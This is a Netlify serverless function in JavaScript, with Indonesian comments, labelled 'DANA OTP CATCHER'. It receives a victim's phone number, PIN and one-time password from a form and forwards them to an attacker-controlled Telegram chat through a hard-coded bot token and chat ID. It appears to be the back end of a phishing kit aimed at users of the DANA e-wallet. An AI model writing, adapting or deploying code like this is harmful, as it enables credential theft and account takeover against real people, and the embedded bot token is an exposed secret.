// netlify/functions/send-to-telegram.js

const BOT_TOKEN = '7329000179:AAFgFH2vfFHDdP9w5SYfO5uw3e4ai6lMF8E';
const CHAT_ID = '5831789218'; // bisa didapat dari @userinfobot

exports.handler = async function(event, context) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  try {
    const body = JSON.parse(event.body);
    const { nohp, pin, otp } = body;

    const message = `
🔔 *DANA OTP CATCHER*
📱 Nomor: +62${nohp}
🔒 PIN: ${pin}
🔐 OTP: ${otp}
🕒 ${new Date().toLocaleString('id-ID')}
`;

    const sendMessageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const res = await fetch(sendMessageUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const telegramRes = await res.json();

    if (!telegramRes.ok) {
      return {
        statusCode: 500,
        body: JSON.stringify({ error: 'Gagal kirim ke Telegram', telegramRes }),
      };
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Terjadi kesalahan', detail: error.message }),
    };
  }
};

